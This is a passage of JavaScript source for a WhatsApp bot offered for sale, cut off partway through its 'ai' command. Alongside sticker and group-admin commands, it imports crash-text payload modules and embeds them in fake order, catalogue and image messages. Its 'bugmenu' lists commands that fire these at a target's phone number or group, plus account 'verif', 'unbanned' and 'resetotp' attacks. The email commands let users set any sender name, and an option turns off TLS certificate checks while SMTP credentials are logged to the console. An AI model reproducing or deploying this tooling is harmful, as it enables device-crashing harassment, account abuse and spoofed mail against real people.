// CREATE BY LEXXY OFFICIAL
// AUTHOR : LEXXY
// ADD FITUR : NYX CHANN
// BASE BY : LEXXY

// ADA ERROR? CHAT GUA wa.me/6281216465289
// GITHUB : NYX095

// UNTUK HOST/PASSWORD NODEMAILER SENDIRI, BISA PAKE SMTP YA ATAU GMAIL
const { modul } = require('./module');
const { axios, baileys, chalk, cheerio, child_process, crypto, FileType, fs, md5, moment, ms, nodemailer, PhoneNumber, speed, util, yargs } = modul;
const { Configuration, OpenAIApi } = modul.openai;
const { exec, spawn, execSync } = child_process
const { downloadContentFromMessage, BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@adiwajshing/baileys')
const argv = yargs.argv
const { formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, reSize, generateProfilePicture } = require('./lib/myfunc')
const { buttonkal } = require('./virtex/nyxbutton')
const { bugsw } = require('./virtex/bugsw')
const { place } = require('./virtex/place')
const { iphone } = require('./virtex/iphone')
const { iphone1 } = require('./virtex/iphone1')
const { iphone2 } = require('./virtex/iphone2')
const { iphone3 } = require('./virtex/iphone3')
const { iphone4 } = require('./virtex/iphone4')
const { iphone5 } = require('./virtex/iphone5')
const { iphone6 } = require('./virtex/iphone6')
const { buttonvirus } = require('./lib/buttonvirus')
const { virtex, vipi } = require('./virtex/virtex')
const { ngazap } = require('./virtex/ngazap')
const { virkon1 } = require('./virtex/virkon1')
const { virtex2 } = require('./virtex/virtex2')
const { virtex3 } = require('./virtex/virtex3')
const os = require('os')
const { color, bgcolor } = require('./lib/color')
const antilink = JSON.parse(fs.readFileSync('./database/antilink.json').toString())
const owner = JSON.parse(fs.readFileSync('./database/owner.json').toString())
const premium = JSON.parse(fs.readFileSync('./database/premium.json').toString())
const setting = JSON.parse(fs.readFileSync('./config.json').toString())
const thumb = fs.readFileSync('./image/loli1.jpeg')


const ownerasli = [`${setting.ownerNumber}`, "6281216465289"] //ownerasli gabisa di delowner
const prefa = ['','!','.',',','🐤','🗿']
const ownerNumber = setting.ownerNumber
const botName = setting.botName
const ownerName = setting.ownerName
const openAI_Apikey = setting.openAIApikey
const autoread = true
const host = setting.host
const user = setting.user
const pass = setting.pass
const port = process.env.PORT || 465
const secure = false
const enableWeakSecurity = argv['weak-security']



global.db = JSON.parse(fs.readFileSync('./database/database.json'))
if (global.db) global.db = {
sticker: {},
database: {},
game: {},
others: {},
users: {},
chats: {},
...(global.db || {})
}



module.exports = lexx = async (lexx, msg, chatUpdate, store) => {
try {
const body = (msg.mtype === 'conversation') ? msg.message.conversation : (msg.mtype == 'imageMessage') ? msg.message.imageMessage.caption : (msg.mtype == 'videoMessage') ? msg.message.videoMessage.caption : (msg.mtype == 'extendedTextMessage') ? msg.message.extendedTextMessage.text : (msg.mtype == 'buttonsResponseMessage') ? msg.message.buttonsResponseMessage.selectedButtonId : (msg.mtype == 'listResponseMessage') ? msg.message.listResponseMessage.singleSelectReply.selectedRowId : (msg.mtype == 'templateButtonReplyMessage') ? msg.message.templateButtonReplyMessage.selectedId : (msg.mtype === 'messageContextInfo') ? (msg.message.buttonsResponseMessage?.selectedButtonId || msg.message.listResponseMessage?.singleSelectReply.selectedRowId || msg.text) : ''
const budy = (typeof msg.text == 'string' ? msg.text : '')
const prefix = prefa ? /^[°•π÷×¶∆£¢€¥®=????+✓_=|~!?@#%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®=????+✓_=|~!?@#%^&.©^]/gi)[0] : "#" : prefa ?? global.prefix
const content = JSON.stringify(msg.message)
const { type, quotedMsg, mentioned, now, fromMe } = msg
const isCmd = body.startsWith(prefix)
const from = msg.key.remoteJid

const isGroup = msg.chat.endsWith('@g.us')
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const pushname = msg.pushName || "No Name"
const botNumber = await lexx.decodeJid(lexx.user.id)
const groupMetadata = msg.isGroup ? await lexx.groupMetadata(msg.chat).catch(e => {}) : ''
const participants = msg.isGroup ? await groupMetadata.participants : ''

const groupName = msg.isGroup ? groupMetadata.subject : ''
const groupAdmins = msg.isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
const groupOwner = msg.isGroup ? groupMetadata.owner : ''
const groupMembers = msg.isGroup ? groupMetadata.participants : ''
const isBotAdmins = msg.isGroup ? groupAdmins.includes(botNumber) : false
const isGroupAdmins = msg.isGroup ? groupAdmins.includes(msg.sender) : false
const isAdmins = msg.isGroup ? groupAdmins.includes(msg.sender) : false
const isAntiLink = antilink.includes(from) ? true : false


//Ngebaca Image
const isImage = (type == 'imageMessage')
const isQuotedMsg = (type == 'extendedTextMessage')
const isMedia = (type === 'imageMessage' || type === 'videoMessage');
const isQuotedImage = isQuotedMsg ? content.includes('imageMessage') ? true : false : false
const isVideo = (type == 'videoMessage')
const isQuotedVideo = isQuotedMsg ? content.includes('videoMessage') ? true : false : false
const isSticker = (type == 'stickerMessage')
const isQuotedSticker = isQuotedMsg ? content.includes('stickerMessage') ? true : false : false 
const isQuotedAudio = isQuotedMsg ? content.includes('audioMessage') ? true : false : false

const sender = isGroup ? (msg.key.participant ? msg.key.participant : msg.participant) : msg.key.remoteJid
const isPremium = [botNumber, ...ownerasli, ...owner, ...premium].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(msg.sender)
const itsMe = msg.sender == botNumber ? true : false
const text = q = args.join(" ")
const mengsplit = text.split("|")[0]
const isRealOwner = [botNumber, ...ownerasli].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(msg.sender)
const isOwner = [botNumber, ...ownerasli, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(msg.sender)
const quoted = msg.quoted ? msg.quoted : msg
const mime = (quoted.msg || quoted).mimetype || ''
const jam = moment.tz('asia/jakarta').format('HH:mm:ss')
const dt = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
const ucapanWaktu = "Selamat "+dt.charAt(0).toUpperCase() + dt.slice(1)
const wib = moment.tz('Asia/Jakarta').format('HH : mm')
const wita = moment.tz('Asia/Makassar').format('HH : mm')
const wit = moment.tz('Asia/Jayapura').format('HH : mm')   
const tanggal = moment.tz('Asia/Jakarta').format('DD/MM/YY')  

// Untuk If
const OnlyPrem = `Maaf Kak ${pushname} Fitur Ini Hanya Khusus Untuk Premium Atau Owner!`
const OnlyOwner = `Maaf Kak ${pushname} Fitur Ini Khusus Owner!`

// Lanjut Function /////////////////


lexx.getName = (jid, withoutContact  = false) => {
let id = lexx.decodeJid(jid)
withoutContact = lexx.withoutContact || withoutContact 
let v
if (id.endsWith("@g.us")) return new Promise(async (resolve) => {
v = store.contacts[id] || {}
if (!(v.name || v.subject)) v = lexx.groupMetadata(id) || {}
resolve(v.name || v.subject || PhoneNumber('+' + id.replace('@s.whatsapp.net', '')).getNumber('international'))
})
else v = id === '0@s.whatsapp.net' ? {
id,
name: 'WhatsApp'
} : id === lexx.decodeJid(lexx.user.id) ?
lexx.user :
(store.contacts[id] || {})
return (withoutContact ? '' : v.name) || v.subject || v.verifiedName || PhoneNumber('+' + jid.replace('@s.whatsapp.net', '')).getNumber('international')}


lexx.sendContact = async (jid, kon, quoted = '', opts = {}) => {
var listt = []
for (let i of kon) {
listt.push({
displayName: await lexx.getName(i + '@s.whatsapp.net'),
vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await lexx.getName(i + '@s.whatsapp.net')}\nFN:${await lexx.getName(i + '@s.whatsapp.net')}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Ponsel\nitem2.EMAIL;type=INTERNET:nyxchannwebs@gmail.com\nitem2.X-ABLabel:Email\nitem3.URL:https://github.com/NYX095/?hl=id\nitem3.X-ABLabel:Instagram\nitem4.ADR:;;Indonesia;;;;\nitem4.X-ABLabel:Region\nEND:VCARD`})}
//=================================================//
lexx.sendMessage(jid, { contacts: { displayName: `${listt.length} Kontak`, contacts: listt }, ...opts }, { quoted })}

lexx.downloadAndSaveMediaMessage = async(msg, type_file, path_file) => {
if (type_file === 'image') {
var stream = await downloadContentFromMessage(msg.message.imageMessage || msg.message.extendedTextMessage?.contextInfo.quotedMessage.imageMessage, 'image')
let buffer = Buffer.from([])
for await(const chunk of stream) {
buffer = Buffer.concat([buffer, chunk])
}
fs.writeFileSync(path_file, buffer)
return path_file
} else if (type_file === 'video') {
var stream = await downloadContentFromMessage(msg.message.videoMessage || msg.message.extendedTextMessage?.contextInfo.quotedMessage.videoMessage, 'video')
let buffer = Buffer.from([])
for await(const chunk of stream) {
  buffer = Buffer.concat([buffer, chunk])
}
fs.writeFileSync(path_file, buffer)
return path_file
} else if (type_file === 'sticker') {
var stream = await downloadContentFromMessage(msg.message.stickerMessage || msg.message.extendedTextMessage?.contextInfo.quotedMessage.stickerMessage, 'sticker')
let buffer = Buffer.from([])
for await(const chunk of stream) {
buffer = Buffer.concat([buffer, chunk])
}
fs.writeFileSync(path_file, buffer)
return path_file
} else if (type_file === 'audio') {
var stream = await downloadContentFromMessage(msg.message.audioMessage || msg.message.extendedTextMessage?.contextInfo.quotedMessage.audioMessage, 'audio')
let buffer = Buffer.from([])
for await(const chunk of stream) {
buffer = Buffer.concat([buffer, chunk])
}
fs.writeFileSync(path_file, buffer)
return path_file
}
}

lexx.sendListMsg = (jid, text = '', footer = '', title = '' , butText = '', sects = [], quoted) => {
let sections = sects
var listMes = {
text: text,
footer: footer,
title: title,
buttonText: butText,
sections}
lexx.sendMessage(jid, listMes, { quoted: quoted })}

const reply = (teks) => {
return lexx.sendMessage(msg.chat, { text: teks, contextInfo:{"externalAdReply": {"title": `${botName}`,"body": ``, "previewType": "PHOTO","thumbnailUrl": `https://github.com/NYX095`,"thumbnail": "", "sourceUrl": ""}}}, { quoted: msg })}



try {
const isNumber = x => typeof x === 'number' && !isNaN(x)
const user = global.db.users[msg.sender]
if (typeof user !== 'object') global.db.users[msg.sender] = {}
const chats = global.db.chats[msg.chat]
if (typeof chats !== 'object') global.db.chats[msg.chat] = {}
} catch (err) {
console.error(err)
}

if (!lexx.public) {
if (!msg.key.fromMe) return
}

if (!msg.isGroup && isCmd && !fromMe) {
console.log('->[\x1b[1;32mCMD\x1b[1;37m]', color(moment(msg.messageTimestamp * 1000).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), color(`${prefix + command} [${args.length}]`), 'from', color(pushname))
}
if (msg.isGroup && isCmd && !fromMe) {
console.log('->[\x1b[1;32mCMD\x1b[1;37m]', color(moment(msg.messageTimestamp *1000).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), color(`${prefix + command} [${args.length}]`), 'from', color(pushname), 'in', color(groupName))
}

if (msg.sender.startsWith('212')) return lexx.updateBlockStatus(msg.sender, 'block')

try {
var pp_user = await lexx.profilePictureUrl(sender, 'image')
} catch {
var pp_user = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
} 
let ppnyauser = await getBuffer(pp_user)

if (isGroup && isAntiLink) {
if (!isBotGroupAdmins) return reply('Untung Bot Bukan Admin')
var linkgce = await lexx.groupInviteCode(msg.chat)
if (chats.includes(`https://chat.whatsapp.com/${linkgce}`)) {
reply(`\`\`\`「 Detect Link 」\`\`\`\n\nAnda tidak akan dikick bot karena yang anda kirim adalah link group yg ada di group ini`)
} else if (isUrl(chats)) {
let bvl = `\`\`\`「 Detect Link 」\`\`\`\n\nAdmin telah mengirim link, admin dibebaskan untuk mengirim link apapun`
if (isGroupAdmins) return reply(bvl)
if (fromMe) return reply(bvl)
if (isOwner) return reply(bvl)
await lexx.sendMessage(msg.chat, { delete: msg.key })
mentions(`「 ANTILINK 」\n\n@${sender.split('@')[0]} Kamu mengirim link group, maaf bot akan kick kamu dari grup`, [sender])
await sleep(3000)
lexx.groupParticipantsUpdate(msg.chat, [sender], "remove")
} else {
}
}

const vtroli = {key: {fromMe: false,"participant":"0@s.whatsapp.net", "remoteJid": "status@broadcast"}, "message": {orderMessage: {itemCount: 99999,status: 200, thumbnail: await reSize(thumb, 100, 100), surface: 200, message: `${iphone6} ${buttonkal} ${virtex2}`, orderTitle: `${ucapanWaktu}`, sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}

const vkatalog = {key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(msg.chat ? {remoteJid: "status@broadcast" } : {})}, message: { "productMessage": { "product": { "productImage":{ "mimetype": "image/jpeg", "jpegThumbnail": await reSize(thumb, 100, 100)},"title": `${bugsw}${buttonkal}`, "description": `${bugsw}${buttonkal}`, "currencyCode": "IDR", "retailerId": `${bugsw}`, "productImageCount": 1}, "businessOwnerJid": `0@s.whatsapp.net`}}} 

const vtext = {
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
message: { 
"imageMessage": { 
"mimetype": "image/jpeg", 
"caption": `${buttonvirus}`, 
"jpegThumbnail": ppnyauser
}
}
}

 function UploadFileUgu (input) {
	return new Promise (async (resolve, reject) => {
			const form = new BodyForm();
			form.append("files[]", fs.createReadStream(input))
			await axios({
				url: "https://uguu.se/upload.php",
				method: "POST",
				headers: {
					"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
					...form.getHeaders()
				},
				data: form
			}).then((data) => {
				resolve(data.data.files[0])
			}).catch((err) => reject(err))
	})
}

function mentions(teks, mems = [], id) {
if (id == null || id == undefined || id == false) {
let res = lexx.sendMessage(from, { text: teks, mentions: mems }, { quoted: msg })
return res
} else {
let res = lexx.sendMessage(from, { text: teks, mentions: mems }, { quoted: msg })
return res
}
}

const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}


if (!autoread) {
lexx.readMessages([msg.key])
}


switch (command) {
case 'bot':
case 'help':
case 'menu': {
let ownerNya = setting.ownerNumber
menu =`═════[ ${botName}-𝙈𝘿 ]═════

${ucapanWaktu} @${sender.split('@')[0]}

╔═══《 Info BOT 》═════⊱
╠❏ Owner: @${ownerNya.split('@')[0]}
╠❏ Nama Bot : ${botName}
╠❏ Nama Owner : ${ownerName}
╠❏ Running : ${setting.Terminal}
╠❏ Prefix : ( ALL PREFIX )
╚════════════════
╔════《 Time ID 》═════⊱
╠〉Wit : ${wit}
╠〉Wib : ${wib}
╠〉Wita : ${wita}
╠〉Date : ${tanggal}
╚════════════════
╔════《 List Menu 》════⊱
╠〉${prefix}ownermenu
╠〉${prefix}bugmenu
╠〉${prefix}groupmenu
╠〉${prefix}menuprem
╚════════════════
╔════《Rules Baca😡》═══⊱
╠〉Jeda 2 Menit
╠〉No Spam
╠〉Harap Sopan
╠〉No Spam Fitur AttGc
╠〉Kalo Ada Error Sung Lapor Owner!
╚═《Powered By ${ownerName} 》══⊱`
lexx.sendMessage(msg.chat, {text: menu, mentions: [sender]}, {quoted: msg})
}
break
case 'menuprem':{
bug = `╔════《 Menu Prem 》════⊱
╠〉${prefix}bugmenu
╠〉${prefix}ai
╠〉${prefix}jadianime
╠〉${prefix}sendmail
╠〉${prefix}sendmailwithimg
╚════════════════⊱`
lexx.sendMessage(msg.chat, {text:bug}, {quoted: msg})
}
break
case 'groupmenu':{
bug = `╔════《 Menu Group 》════⊱
╠〉${prefix}kick @tag
╠〉${prefix}hidetag <text>
╠〉${prefix}join <linkgrup>
╠〉${prefix}sticker <img> 
╠〉${prefix}smeme
╠〉${prefix}antilink off/on
╚════════════════⊱`
lexx.sendMessage(msg.chat, {text:bug}, {quoted: msg})
}
break
case 'ownermenu':{
bug = `╔═══《 Owner Menu 》═══⊱
╠〉${prefix}self
╠〉${prefix}public
╠〉${prefix}addowner 628xxx
╠〉${prefix}delowner 628xxx
╠〉${prefix}addprem 628xxx
╠〉${prefix}delprem 628xxx
╠〉${prefix}listowner
╠〉${prefix}listprem
╠〉${prefix}leave
╠〉${prefix}join 
╠〉${prefix}stats 
╠〉${prefix}test
╠〉${prefix}restart 
╠〉${prefix}script
╠〉${prefix}owner
╠〉${prefix}delete
╚════════════════⊱`
lexx.sendMessage(msg.chat, {text:bug}, {quoted: msg})
}
break
case 'bugmenu':{
bug = `╔═══《 Bug Menu 》═══⊱
╠〉${prefix}🌷 628xxx [ But 6 ]
╠〉${prefix}🔥 628xxx [ But 6 ]
╠〉${prefix}🌷🌷 628xxx [ But 853 ]
╠〉${prefix}crash 628xxx [ Butt 6 ]
╠〉${prefix}virkon 628xxx [ V Ctt ]
╠〉${prefix}audio 628xxx [ V Audio ]
╠〉${prefix}darkness 628xxx [ V Doc ]
╠〉${prefix}pdfcrash 628xxx [ V Pdf ]
╠〉${prefix}pay 628xxx [ V Payment ]
╠〉${prefix}jagoan 628xxx [ V Button ]
╠〉${prefix}vwebpage 628xxx [ V WebPage ]
╠〉${prefix}vweb 628xxx [ V Web ]
╠〉${prefix}katalog 628xxx [ V Katalog ]
╠〉${prefix}katalogv2 628xxx [ VirLog ]
╠〉${prefix}titid 628xxx [ V text ]
╠〉${prefix}ginvite 628xxx [ V Invite ]
╠〉${prefix}loc 628xxx [ V Location ] 
╠〉${prefix}buttonlist 628xxx [ V List ]
╠〉${prefix}troli 628xxx [ V Troli ]
╠〉${prefix}allbug 628xxx [ All V Mutakhir ]
╠〉${prefix}allvirtex 628xxx [ All V Text ]
╚══════════════⊱
╔══《Attack Group》════⊱
╠〉${prefix}santetgc <linkgrup> [ But 853 ]
╠〉${prefix}kataloggc <linkgrup> [ V Katalog ]
╚══════════════⊱
╔══《Bug Verif》════⊱
╠〉${prefix}bye 
╠〉${prefix}verif 
╠〉${prefix}unbanned
╠〉${prefix}resetotp
╚══════════════⊱`
lexx.sendMessage(msg.chat, {text:bug}, {quoted: msg})
}
break
case 'smeme':
case 'stikermeme':
case 'stickermeme':
case 'memestiker':
if (!isPremium) return reply(OnlyPrem)
var atas = q.split('|')[0]
var bawah = q.split('|')[1]
if (!atas) return reply(`Kirim gambar dengan caption ${prefix+command} text_atas|text_bawah atau balas gambar yang sudah dikirim`)
if (!bawah) return reply(`Kirim gambar dengan caption ${prefix+command} text_atas|text_bawah atau balas gambar yang sudah dikirim`)
if (isImage || isQuotedImage){
var media = await lexx.downloadAndSaveMediaMessage(msg, 'image', `./sticker/${sender.split('@')[0]}.jpg`)
var media_url = (await UploadFileUgu(media)).url
var meme_url = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${media_url}`
var opt = { packname: 'NYX WANGSAP,', author: 'By Isat Bot' }
lexx.sendImageAsSticker(msg.chat, meme_url, msg, opt)
fs.unlinkSync(media)
} else {
reply(`Kirim gambar dengan caption ${prefix+command} text_atas|text_bawah atau balas gambar yang sudah dikirim`)
}
break
case 's':
case 'stiker':
case 'sticker':
var pname = `${setting.botName}`
var athor = `${setting.ownerName}`
if (isImage || isQuotedImage){
await lexx.downloadAndSaveMediaMessage(msg, "image", `./image/${sender.split("@")[0]}.jpeg`)
var media = fs.readFileSync(`./image/${sender.split("@")[0]}.jpeg`)
var opt = { packname: pname, author: athor }
lexx.sendImageAsSticker(msg.chat, media, msg, opt)
fs.unlinkSync(media)
} else if (isVideo || isQuotedVideo) {
var media = await lexx.downloadAndSaveMediaMessage(msg, 'video', `./sticker/${sender}.jpeg`)
var opt = { packname: pname, author: athor }
lexx.sendImageAsSticker(msg.chat, media, msg, opt)
fs.unlinkSync(media)
} else {
reply(`Kirim video/foto dengan caption ${prefix+command} atau balas video/foto yang sudah dikirim`)
}
break
case 'sc':
case 'scbot':
case 'script':{
sc = `Halo Kak, Silahkan beli script bot kepada owner, Owner: https://wa.me/6281216465289\nMurah kok, Ga Sampe 50k😋`
msg.reply(sc)
}
break
case 'group': case 'grup':
if (!isGroup) return msg.reply('Perintah ini hanya bisa digunakan digrup')
if (!isGroupAdmins) return msg.reply('Perintah ini hanya bisa digunakan oleh Admin Grup')
if (!isBotAdmins) return msg.reply('Bot Harus menjadi admin')
if (args[0] == "off") {
lexx.groupSettingUpdate(msg.chat, 'announcement').then((res) => msg.reply(jsonformat(res))).catch((err) => msg.reply(jsonformat(err)))
} else if (args[0] == "on") {
lexx.groupSettingUpdate(msg.chat, 'not_announcement').then((res) => msg.reply(jsonformat(res))).catch((err) => msg.reply(jsonformat(err)))
} else {
msg.reply(`Kirim perintah #${command} _options_\nOptions : on & off\nContoh : ${prefix+command} on`)
}
break
case 'hidetag':{
if (!isGroup) return msg.reply('Perintah ini hanya bisa digunakan digrup')
if (!isGroupAdmins) return msg.reply('Perintah ini hanya bisa digunakan oleh Admin Grup')
let mem = [];
groupMembers.map( i => mem.push(i.id) )
lexx.sendMessage(msg.chat, { text: q ? q : '', mentions: mem })
}
break
case 'leavegroup':
case 'leave':
case 'leavegc': {
var utiwi = msg.chat
        await reply('Byee Bot akan pergi , , ! (≧ω≦)ゞ') 
        await lexx.groupLeave(utiwi)
        }
        break
case 'kick': {
if (!isGroup) return msg.reply('Perintah ini hanya bisa digunakan digrup')
if (!isBotAdmins) return msg.reply('Jadiin bot admin dong biar bisa')
if (!isGroupAdmins) return msg.reply('Fitur ini khusus admin grup')
let users = msg.mentionedJid[0] ? msg.mentionedJid[0] : msg.quoted ? msg.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await lexx.groupParticipantsUpdate(msg.chat, [users], 'remove').then((res) => msg.reply(jsonformat(res))).catch((err) => msg.reply(jsonformat(err)))
}
break
case 'restart':
if (!isRealOwner) return reply(OnlyOwner)
reply(`_Restarting ${setting.botName}_`)
exec(`rm -rf package-lock.json && rm -rf node_modules/@adiwajshing && unzip modulnya && npm i && pm2 restart all`)
await sleep(10000)
break
case 'test':
case 'tes':
case 'stats': {
const used = process.memoryUsage()
const cpus = os.cpus().map(cpu => {
cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
return cpu
})
const cpu = cpus.reduce((last, cpu, _, { length }) => {
last.total += cpu.total
last.speed += cpu.speed / length
last.times.user += cpu.times.user
last.times.nice += cpu.times.nice
last.times.sys += cpu.times.sys
last.times.idle += cpu.times.idle
last.times.irq += cpu.times.irq
return last
}, {
speed: 0,
total: 0,
times: {
user: 0,
nice: 0,
sys: 0,
idle: 0,
irq: 0
}
})
let timestamp = speed()
let latensi = speed() - timestamp
respon = `
Kecepatan Respon ${latensi.toFixed(4)} _Second_ \nRuntime : ${runtime(process.uptime())}
💻 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}
`
msg.reply(respon)
}
break
case 'public': {
if (!isOwner) return reply(OnlyOwner)
lexx.public = true
reply(`Success Change ${botName} Mode To Public`)
}
break
case 'self': {
if (!isOwner) return reply(OnlyOwner)
lexx.public = false
reply(`Success Change ${botName} Mode To Self`)
}
break
case 'listowner':{
let listusr = `*List Owner*\n\n${owner.length}\n`
var no = 1
for (let x of owner) {
listusr += `\nUser: ${no++}\nID: ${x}\n\n`
msg.reply(listusr)
}
}
break
case 'listprem':{
let listusr = `*List Owner*\n\n${premium.length}\n`
var no = 1
for (let x of premium) {
listusr += `\nUser: ${no++}\nID: ${x}\n\n`
msg.reply(listusr)
}
}
break
case 'addprem':
if (!isOwner) return reply(OnlyOwner)
if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 0`)
var bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
var ceknye = await lexx.onWhatsApp(bnnd + `@s.whatsapp.net`)
if (ceknye.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
premium.push(bnnd)
fs.writeFileSync('./database/premium.json', JSON.stringify(premium))
mentions(`Selamat!!\nNomor @${bnnd.split('@')[0]} Sudah Bisa Mengakses Semua Fitur Di Menu!`)
break
case 'resetalldb':
if (!isRealOwner) return msg.reply(`sorry anda sepertinya bukan pemilik bot`)
owner.splice('[]')
premium.splice('[]')
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
fs.writeFileSync('./database/premium.json', JSON.stringify(owner))
msg.reply(`SUKSES ✅`)
break
case 'delprem':
if (!isOwner) return reply(OnlyOwner) 
if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 0`)
var ya = q.split("|")[0].replace(/[^0-9]/g, '')
var unp = premium.indexOf(ya)
premium.splice(unp, 1)
fs.writeFileSync('./database/premium.json', JSON.stringify(premium))
mentions(`Maaf @${ya.split('@')[0]} Kamu Telah Dihapus Dari Database Oleh Owner dan Tidak Bisa Mengakses Beberapa Fitur Yang Bot Telah Sediakan Di Menu!`)
break
case 'owner': case 'creator': {
lexx.sendContact(msg.chat, ownerasli, msg)
lexx.sendContact(msg.chat, owner, msg)
reply('IY4H')
}
break

case 'antilink':{
if (!isGroup) return reply("hanya bisa di gunakan di grup")
if (!isGroupAdmins && !isOwner) return reply("maaf kamu bukan admin grup/owner")
if (!isBotGroupAdmins) return reply('bot belum menjadi admin')
if (!args[0]) return reply(`Kirim perintah #${command} _options_\nOptions : on & off\nContoh : #${command} on`)
if (args[0] == 'ON' || args[0] == 'on' || args[0] == 'On') {
if (isAntiLink) return reply('Antilink sudah aktif')
antilink.push(msg.chat)
fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink, null, 2))
reply('Successfully Activate Antilink In This Group')
} else if (args[0] == 'OFF' || args[0] == 'OF' || args[0] == 'Of' || args[0] == 'Off' || args[0] == 'of' || args[0] == 'off') {
if (!isAntiLink) return reply('Antilink belum aktif')
antilink.splice(anu, 1)
fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink, null, 2))
reply('Successfully Disabling Antilink In This Group')
} else { reply('Kata kunci tidak ditemukan!') }
}
break

//Menu Prem
case 'del':
case 'delete':
if (!isPremium) return reply(OnlyPrem)
if (!isGroup) return reply("Hanya Bisa Di Dalam Grup")
if (!isGroupAdmins && !isOwner) return reply("Maaf kamu Bukan admin grup kak")
if (!quotedMsg) return reply(`Balas chat dari bot yang ingin dihapus`)
if (!quotedMsg.fromMe) return reply(`Hanya bisa menghapus chat dari bot`)
lexx.sendMessage(msg.chat, { delete: { fromMe: true, id: quotedMsg.id, remoteJid: msg.chat }})
break
case 'sendmail':
if (!isPremium) return reply(OnlyPrem)
if (!q) return reply('Field Not Found\nExample: Nama Pengirim|Targetemail@gmail.com|subject|text')
var darisiapa = q.split('|')[0]
var targetemail = q.split('|')[1]
var subject = q.split('|')[2]
var teksny = q.split('|')[3]
var config = {
  host,
  port: 587,
  secure,
  tls: {
  },
  auth: {
    user,
    pass,
  }
}
if (enableWeakSecurity) {
  config.tls.rejectUnauthorized = false;
}
console.log('config', JSON.stringify(config, null, 2))
var transporter = nodemailer.createTransport(config)
var mailOptions = {
  from: `${darisiapa}`, // sender address
  to: `${targetemail}`,
  subject: `${subject}`, // Subject line
  text: `${teksny}`, // plain text body
  html: `${teksny}` // html body
}
console.log('mailOptions', JSON.stringify(mailOptions, null, 2))
transporter.sendMail(mailOptions, (err, info) => {
  if (err) {
      return reply(err)
  }
  reply(`Email terkirim!\nStatus: ` + info.response)
})
break
case 'sendmailwithimg':
if (!isPremium) return reply(OnlyPrem)
if (!q) return reply('Field Not Found\nExample: Nama Pengirim|Targetemail@gmail.com|subject|text')
if (isImage && isQuotedImage) return reply(`Kirim gambar dengan caption .sendmailwithimg Nama Pengirim|Targetemail@gmail.com|subject|text atau reply gambar yang sudah dikirim dengan pesan *.sendmailwithimg Nama Pengirim|Targetemail@gmail.com|subject|text*`)
await lexx.downloadAndSaveMediaMessage(msg, "image", `./image/${sender.split('@')[0]}.jpg`)
var imageny = fs.readFileSync(`./image/${sender.split('@')[0]}.jpg`)
var darisiapa = q.split('|')[0]
var targetemail = q.split('|')[1]
var subject = q.split('|')[2]
var teksny = q.split('|')[3]
var config = {
  host,
  port: 587,
  secure,
  tls: {
  },
  auth: {
    user,
    pass,
  }
}
if (enableWeakSecurity) {
  config.tls.rejectUnauthorized = false;
}
console.log('config', JSON.stringify(config, null, 2))
var transporter = nodemailer.createTransport(config)
var mailOptions = {
    
    from: `${darisiapa}`,
    to: `${targetemail}`,
    subject: `${subject}`,
    attachments: [{
        filename: `${sender.split('@')[0]}.jpg`,
        path: __dirname + `/image/${sender.split('@')[0]}.jpg`,
        cid: 'logo'
    }],
    html: `<b>${teksny}</b><p><img src = 'cid:logo'></img></p>`
  
}

console.log('mailOptions', JSON.stringify(mailOptions, null, 2))
transporter.sendMail(mailOptions, (err, info) => {
  if (err) {
      return reply(err)
  }
  reply(`Email terkirim!\nStatus: ` + info.response)
})
break
case 'jadianime':
  if (!isPremium) return reply(OnlyPrem)
if (isImage && isQuotedImage) return reply(`Kirim gambar dengan caption *#toanime* atau reply gambar yang sudah dikirim dengan pesan *#toanime*`)
reply("Diproses!")
var AI2D = require('@arugaz/ai2d')
         let qoq = msg.quoted ? msg.quoted : msg
         let img = await qoq.download()            
                                
         let restod = await AI2D(img, {
            crop: "SINGLE",
            proxy: {
               url: "http://60.164.247.52:9002",
               chinese: true,
               image: false
            }
         })
         lexx.sendMessage(msg.chat, { image: { url: restod, caption: `jadianime by ${botName}` } }, { quoted: msg })
  break
case 'ai': {
if (!isPremium) return reply(OnlyPrem)
if (!text) return reply("[!] Masukkan teks.")
var configuration = new Configuration({
    apiKey: openAI_Apikey
})
var openai = new OpenAIApi(configuration)
        var response = await openai.createCompletion({
            model: "text-davinci-003",
            prompt: text,
            temperature: 0,
            max_tokens: 3000,
            top_p: 1,
